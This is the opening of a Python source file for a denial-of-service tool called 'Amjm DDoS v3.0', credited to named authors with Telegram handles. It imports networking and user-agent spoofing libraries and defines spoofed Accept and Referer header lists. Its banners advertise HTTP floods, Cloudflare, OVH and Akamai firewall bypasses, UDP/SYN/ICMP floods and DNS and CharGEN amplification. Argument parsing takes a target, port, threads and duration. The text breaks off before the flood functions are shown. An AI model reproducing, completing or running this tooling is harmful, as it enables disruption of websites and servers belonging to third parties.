import socket
import threading
import random
import os
import time
import requests
import string
from colorama import Fore
from urllib.parse import urlparse
from random import choice as che
from random import randint as ran
from random import _urandom as byt
from certifi import where
from ssl import CERT_NONE , create_default_context
from colorama import init
from requests import get
from sys import argv
from fake_useragent import UserAgent
from datetime import datetime
from threading import Thread
from os import getpid
from os import kill as killx

try:
    init()
except:
    pass

app = ['text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8', '*/*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'text/html, application/xhtml+xml, image/jxr, */*', 'text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1', 'text/html, image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9']
reff = ['https://www.google.com/search?q=','https://google.com/', 'https://www.google.com/', 'https://www.bing.com/search?q=', 'https://www.bing.com/', 'https://www.youtube.com/', 'https://www.facebook.com/']

red = Fore.LIGHTRED_EX; green = Fore.LIGHTGREEN_EX; blue = Fore.LIGHTBLUE_EX; yellow = Fore.LIGHTYELLOW_EX; cyan = Fore.LIGHTCYAN_EX; white = Fore.LIGHTWHITE_EX; magenta = Fore.LIGHTMAGENTA_EX;

os.system('cls' if os.name == 'nt' else 'clear')

def layer7():
    sssss = f"""
    {green}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
 {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
 ░       ░
    {cyan}( {red}*** {green}CREATED BY {blue}Amjml {green}Coded by {green}YasinBm {red}| {red}@{blue}Hj_Amir3 | {yellow}Amjm DDoS | {red}@{magenta}amjm_ddos{red} ***{cyan} )
    """
    print(sssss)

    print(f'''{yellow}╔════════════════════════════════════════════════════════════════════════╗\n{yellow}║ {red}• {cyan}Layer{red}7 {blue}: {magenta}method url port thread rpc{yellow}                                  ║\n{yellow}║{red} •{cyan} Methods {magenta}: {yellow}                                                           ║\n║                                                                        ║\n║ {red}RAW    {cyan}( {green}HIGH PPS FLOOD {cyan}){yellow}                                              ║\n║ {red}BYPASS {cyan}({green} FIREWALL BYPASS OVH , CLOUDFLARE , DDoS-GURD , ... {cyan}){yellow}          ║\n║{red} MIX    {cyan}( {green}HTTP HEAD FLOOD {cyan}){yellow}                                             ║\n║ {red}CLOUD  {cyan}({green} BYPASS CLOUDFLARE NO-SEC , DDoS-GURD , OVH {cyan}){yellow}                  ║\n║ {red}GET    {cyan}( {green}HTTP GET FLOOD {cyan}){yellow}                                              ║\n║ {red}UAM    {cyan}({green} UAM BYPASS CLOUDFLARE {cyan}){yellow}                                       ║\n║ {red}WAF    {cyan}({green} FIREWALL BYPASS {red}+ {cyan}){yellow}                                           ║\n║ {red}OVH    {cyan}({green} OVH BYPASS METHOD {cyan}){yellow}                                           ║\n║ {red}ONEC   {cyan}( {green}HIGH PPS FLOOD WITH CLOSE CONNECTION{cyan} ){yellow}                        ║\n║ {red}SKY    {cyan}({green} GET COOKIE FLOOD {cyan}){yellow}                                            ║\n║ {red}SPOOF  {cyan}({green} SPOOF HEADER GET METHOD {cyan}){yellow}                                     ║\n║ {red}POST   {cyan}({green} POST BYPASS FLOOD {cyan}){yellow}                                           ║\n║ {red}RAW+   {cyan}({green} GET FLOOD BYPASS {cyan}){yellow}                                            ║\n║ {red}HIGH   {cyan}({green} HIGH PPS WITH COOKIE AND BYPASS FIREWALL {cyan}){yellow}                    ║\n║ {red}UAM+   {cyan}({green} UAM BYPASS CLOUDFLARE {red}+ {cyan}){yellow}                                     ║\n║ {red}TLS    {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF{cyan} ){yellow}                 ║\n║ {red}HTTP/2 {cyan}({green} HTTP/2 GET FLOOD WITH COOKIE{cyan} ){yellow}                                ║\n║ {red}GURD   {cyan}({green} BYPASS DDoS-Gurd WAF {cyan}){yellow}                                        ║\n║ {red}KILL   {cyan}({green} HIGH HTTP GET FLOOD{cyan} ){yellow}                                         ║\n║ {red}TLSV2  {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF WITH OUT COOKIE{cyan} ){yellow} ║\n║ {red}NULL   {cyan}({green} NULL HEADERS FLOOD{cyan} ){yellow}                                          ║\n║{red} KILL+  {cyan}({green} HTTP/2 GET FLOOD WITH COOKIE {red}+{cyan} ){yellow}                              ║\n║{red} HTTPS  {cyan}({green} HTTP HEADER FLOOD {red}+{cyan} ){yellow}                                         ║\n║{red} IR     {cyan}({green} BYPASS IRANIAN FIREWALL {red}{cyan}){yellow}                                     ║\n║ {red}WAR    {cyan}( {green}BYPASS AMAZON & VSHIELD WAF {yellow}[{red}x {cyan}Cookie {yellow}] {cyan}){yellow}                     ║\n║ {red}WAR+   {cyan}( {green}BYPASS AMAZON & VSHIELD WAF WITH COOKIE {cyan}){yellow}                     ║\n║ {red}ZEUS   {cyan}( {green}BYPASS AKAMAI & ALL WAFs {cyan}){yellow}                                    ║\n║ {red}BY+ {cyan}   ({green} FIREWALL BYPASS OVH , CLOUDFLARE , DDoS-GURD , ...{red} +{cyan} ){yellow}        ║\n║ {red}PRO    {cyan}( {green}BYPASS FASLY WAF {cyan}){yellow}                                            ║\n║ {red}CRASH  {cyan}( {green}BYPASS IRANIAN FIREWALLS {yellow}[{red}x {cyan}Cookie {yellow}]{cyan} ){yellow}                        ║\n║ {red}HTTPS+ {cyan}( {green}HTTPS GET FLOOD HTTP/1.2 VERSION WITH COOKIE{yellow}{cyan} ){yellow}                ║\n║ {red}WAF+   {cyan}({green} FIREWALL BYPASS {red}++ {cyan}){yellow}                                          ║\n║ {red}STORM  {cyan}({green} BEST METHOD FOR DSTAT {cyan}){yellow}                                       ║\n║ {red}STORM+ {cyan}({green} BEST METHOD FOR DSTAT {red}+ {cyan}){yellow}                                     ║\n║ {red}FUCK   {cyan}({green} HIGH HTTP GET FLOOD {red}++{cyan} ){yellow}                                      ║\n║ {red}TLSV3  {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF {red}++{cyan} ){yellow}              ║\n║ {red}TLSV4  {cyan}({green} TLS CERTIFICATE FLOOD PACKET AND BYPASS WAF {red}+++{cyan} ){yellow}             ║\n║ {red}SKY+   {cyan}({green} GET COOKIE FLOOD {red}+ {cyan}){yellow}                                          ║\n║                                                                        ║\n║ {red}#{cyan}Amjm | {magenta}@Hj_Amir3 | {green}TELEGRAM{yellow}                                     ║\n╚════════════════════════════════════════════════════════════════════════╝\n╔════════════════════════════════════════════════════════════════════════╗\n║ {red}• {yellow}tls {cyan}https://www.example.com {green}443 {magenta}1000 {red}1500{cyan} 120{yellow}                        ║\n║ {red}•{cyan} Amjm{red}-{cyan}DDoS{yellow}                                                            ║\n╚════════════════════════════════════════════════════════════════════════╝''')

layer4 = f"""
    {red}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
 {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
 ░       ░
    {cyan}( {red}*** {green}CREATED BY {blue}Amjm {green}Coded by {green}YasinBm {red}| {red}@{blue}Hj_Amir3 | {yellow}Amjm_DDoS | {red}@{magenta}amjm_ddos{red} ***{cyan} )
    {yellow}╔════════════════════════════════════════════════════════════════════════╗
    {yellow}║ {red}• {blue}Layer{green}4 : {magenta}method ip port thread rpc{yellow}                                   ║
    {yellow}║ {red}• {blue}Methods {red}:   {yellow}                                                         ║
    {yellow}║                       {yellow}                                                 ║
    {yellow}║ {red}UDP   {cyan}( {green}Send UDP packet to server {cyan}){yellow}                                    ║
    {yellow}║ {red}TCP   {cyan}( {green}Send TCP packet to server {cyan}){yellow}                                    ║
    {yellow}║ {red}SYN   {cyan}( {green}Send SYN packet to server {cyan}) {yellow}                                   ║
    {yellow}║ {red}ICMP  {cyan}( {green}Send ICMP packet to server {cyan}){yellow}                                   ║
    {yellow}║ {red}GUDP  {cyan}( {green}Send GUDP packet to server {cyan}){yellow}                                   ║
    {yellow}║ {red}UDP+  {cyan}( {green}Send UDP packet to server {red}+ {cyan}){yellow}                                  ║
    {yellow}║ {red}DNS   {cyan}( {green}DNS amplification attack {cyan}){yellow}                                     ║
    {yellow}║ {red}AMP   {cyan}( {green}CharGEN amplification attack {cyan}){yellow}                                 ║
    {yellow}║ {red}FLOOD {cyan}( {green}OVH SERVER UDP FLOOD {cyan}){yellow}                                         ║
    {yellow}║ {red}HAND  {cyan}( {green}TCP HANDSHAKE FLOOD {cyan}){yellow}                                          ║                                  
    {yellow}║ {red}RDP   {cyan}( {green}UDP FLOOD ON RDP VPS {cyan}){yellow}                                         ║
    {yellow}║ {red}CRAFT {cyan}( {green}Mincraft SERVER ATTACK {cyan}){yellow}                                       ║
    {yellow}║                                                                        ║
    {yellow}║{red}#{cyan}Amjm | {red}@Hj_Amir3 | {green}TELEGRAM   {yellow}                                   ║
    {yellow}╚════════════════════════════════════════════════════════════════════════╝
    {yellow}╔════════════════════════════════════════════════════════════════════════╗
    {yellow}║ {red}• {cyan}udp {magenta}127.0.0.1 80 1000 1500 120{yellow}                                       ║
    {yellow}║ {red}• {green}Amjm{red}-{green}DDoS{yellow}                                                            ║
    {yellow}╚════════════════════════════════════════════════════════════════════════╝
"""

def respon():
    try:
        print(f"""
                {blue}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
    ░  ░  {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
            {cyan}╔══════════════════════════════════════════════════════════════════╗

                                    {yellow} Response {red}: {green}{rs}
                                    {yellow} Target   {red}: {green}{url}

            {cyan}╚══════════════════════════════════════════════════════════════════╝""")
    except:
        pass

launch = f"""
    {green}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
 {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
 ░       ░
    {cyan}( {red}*** {green}CREATED BY {blue}Amjm {green}Coded by {green}YasinBm {red}| {red}@{blue}Hj_Amir3 | {yellow}Amjm DDoS | {red}@{magenta}Amjm_DDoS{red} ***{cyan} )
    {yellow}╔══════════════════════════════════════════════════════════════════════════════╗
    {yellow}║                              {magenta}Amjm_DDoS{yellow}                                       ║
    {yellow}║ {yellow}                                                                             ║
    {yellow}║               {green}Launch {red}: {yellow}Linux {red}:{yellow} python3 ddos.py {red}<{blue}options{red}> {yellow}                    ║
    {yellow}║               {green}Launch {red}: {yellow}Windows {red}: {yellow}python ddos.py {red}<{blue}options{red}>{yellow}                    ║
    {yellow}║                                                    {yellow}                          ║
    {yellow}║    {cyan}Methods {red}| {green}Linux {red}: {green}python3 ddos.py l7 {red}|{green} Windows {red}: {green}python ddos.py l7 {yellow}       ║
    {yellow}║                                                          {yellow}                    ║
    {yellow}║                  {red}#{cyan}Amjm {red}| {cyan}@{red}Hj_Amir3 | {green}TELEGRAM   {yellow}                       ║
    {yellow}╚══════════════════════════════════════════════════════════════════════════════╝
"""

def options():
    sss = f'''
        {blue}                                                                                         
 @@@@@@   @@@@@@@@@@        @@@  @@@@@@@@@@      @@@@@@@   @@@@@@@    @@@@@@    @@@@@@   
@@@@@@@@  @@@@@@@@@@@       @@@  @@@@@@@@@@@     @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@   
@@!  @@@  @@! @@! @@!       @@!  @@! @@! @@!     @@!  @@@  @@!  @@@  @@!  @@@  !@@       
!@!  @!@  !@! !@! !@!       !@!  !@! !@! !@!     !@!  @!@  !@!  @!@  !@!  @!@  !@!       
@!@!@!@!  @!! !!@ @!@       !!@  @!! !!@ @!@     @!@  !@!  @!@  !@!  @!@  !@!  !!@@!!    
!!!@!!!!  !@!   ! !@!       !!!  !@!   ! !@!     !@!  !!!  !@!  !!!  !@!  !!!   !!@!!!   
!!:  !!!  !!:     !!:       !!:  !!:     !!:     !!:  !!!  !!:  !!!  !!:  !!!       !:!  
:!:  !:!  :!:     :!:  !!:  :!:  :!:     :!:     :!:  !:!  :!:  !:!  :!:  !:!      !:!   
::   :::  :::     ::   ::: : ::  :::     ::       :::: ::   :::: ::  ::::: ::  :::: ::   
 :   : :   :      :     : :::     :      :       :: :  :   :: :  :    : :  :   :: : :    
                                                                                         
  {blue}({red}v.{yellow}3{red}.{yellow}0{blue})
    ░       ░
'''
    print(sss)
    print(f'''            {yellow}╔══════════════════════════════════════════════════════════════════════════════╗
            {yellow}║                                                   			   ║
            {yellow}║ {red}PUBLIC    {cyan}({green} GET YOUR SERVER PUBLIC ADDRES {cyan}){yellow}                                  ║
            {yellow}║ {red}INFO      {cyan}({green} GET WEBSITE FIREWALL INFO {cyan}){yellow}	    			           ║
            {yellow}║ {red}STAT_REQ  {cyan}({green} GET WEBSITE STATUS CODE {cyan}){yellow}                                        ║
            {yellow}║ {red}OPTIONS   {cyan}({green} SHOW OPTIONS {cyan}){yellow}                                                   ║
            {yellow}║ {red}CLEAR     {cyan}({green} CLEAR PAGE {cyan}){yellow}                                                     ║
            {yellow}║ {red}PING      {cyan}({green} GET WEBSITE IP ADDRES {cyan}){yellow}                                          ║
            {yellow}║                                                                              ║
            {yellow}║ {red}#{blue}Amjm{red}-{blue}DDoS {red}@{green}Hj_Amir3{yellow}                                                       ║
            {yellow}╚══════════════════════════════════════════════════════════════════════════════╝
''')

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
try:
    try:
        if str(argv[1]) == 'l7':
            layer7()
        elif str(argv[1]) == 'l4':
            print(layer4)
        elif str(argv[1]) == 'all':
            layer7()
            print(layer4)
    except:
        print(launch)
        pass
except:
    pass

try:
    method = str(argv[1])
    url = str(argv[2])
    port = int(argv[3])
    threads = int(argv[4])
    rpc = int(argv[5])
    timme = int(argv[6])
    proxy = int(argv[7])
except:
    pass

def timer():
    try:
        time.sleep(timme); killx(getpid(), 9)
    except:
        pass

try:
    def generate_fake_phpsessid(length):
        characters = string.ascii_l
